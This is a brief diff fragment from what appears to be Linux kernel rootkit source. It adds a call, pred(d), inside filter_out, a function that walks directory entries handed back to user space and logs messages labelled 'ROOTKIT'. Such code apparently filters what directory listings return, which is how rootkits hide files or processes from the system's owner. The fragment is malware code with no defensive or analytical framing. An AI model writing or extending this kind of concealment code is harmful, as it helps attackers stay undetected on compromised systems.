@@ -65,6 +65,8 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 		d = (dirp+index);
 		reclen = d->d_reclen;
 		
+		pred(d);
+		
 		if (reclen <= 0) {
 			pr_info("ROOTKIT reclen was 0 (CRITICAL ERROR THIS SHOULD NEVER HAPPEN)");
 			break;
